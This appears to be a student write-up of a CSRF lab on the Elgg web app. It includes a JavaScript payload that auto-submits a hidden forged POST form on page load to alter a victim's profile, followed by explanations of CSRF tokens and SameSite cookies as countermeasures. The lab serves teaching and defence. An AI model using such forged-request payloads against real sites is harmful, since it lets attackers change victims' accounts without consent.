# CSRF Attack Lab on Elgg WebApp

## Overview

A Cross-Site Request Forgery (CSRF) attack involves a victim user, a trusted site and a malicious site. The victim user holds an active session with a trusted site while visiting a malicious site. The malicious site injects an HTTP request for the trusted site into the victim user session, causing damages.

## Task 2: CSRF Attack using POST Request

Modifiying the *editprofile.html* file with the following code will perform the CSRF attack:

```js
function forge_post()
{
    var fields;

    fields += "<input type='hidden' name='name' value='Alice'>";
    fields += "<input type='hidden' name='briefdescription' value='Boby is my Hero'>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
    fields += "<input type='hidden' name='guid' value='56'>";

    var p = document.createElement("form");

    p.action = "http://www.seed-server.com/action/profile/edit";
    p.innerHTML = fields;
    p.method = "post";
    document.body.appendChild(p);
    p.submit();
}

window.onload = function() { forge_post();}
```

1. Is it possibile to derive the *guid* of Alice by accessing her profile and inspecting the *html* of the web page.
    In this way we can notice that, for instance, the button for adding Alice as a friend contains her *guid* in the link.
2. I don't think it is possible without knowing in advance the *guid* and fill the javascript code with it in the attacker32.com website.

## Task 3: Enabling Elgg’s Countermeasure

By enabling the `validate` function we can see that the attack no longer works and leaves the message "Form is missing \__token or \__ts fields" on Alice profile.

CSRF tokens should be stored server-side within the user's session data. There are different ways of transmitting the CSRF tokens between client and server, all them have the aim of treating the tokens as secrets from the attackers. So the attacker doesn't know the tokens and they also must be unique and impossible to guess. The server application must not proceed unless it validates the tokens. In this way, only the legit user can send authentic requests.

## Task 4: Experimenting with the SameSite Cookie Method

It is possible to see that when we navigate accross *example32.com*, with all the three different requests we can see all the cookies. On the other hand, when we access *attacker32.com*, *coookie-normal* is always displayed, *cookie-lax* is displayed only for link and GET request and *cookie-strict* is never displayed.

If SameSite is set to `Strict`, the cookie will be sent in a first-party context only, that is, if the site for the cookie matches the site currently shown in the URL. Meanwhile, if SameSite is set to `Lax`, cookies are not sent on normal cross-site subrequests, but are sent when a user is navigating to the origin site, following a link. This is why *cookie-strict* is displayed only on *example32.com*, which consists on the first-party context. `Lax` is a good choice for cookies affecting the display of the site and `Strict` is useful for cookies related to actions the user is taking.

SameSite attribute allows to decide if a cookie should be restricted to the same site context. If set, this countermeasure can prevent CSRF attacks which rely on the fact that cookies are attached to any request to a given origin.

I would help Elgg by adding the SameSite attribute (set as `Strict`) to a single sessionID cookie or the tokens.
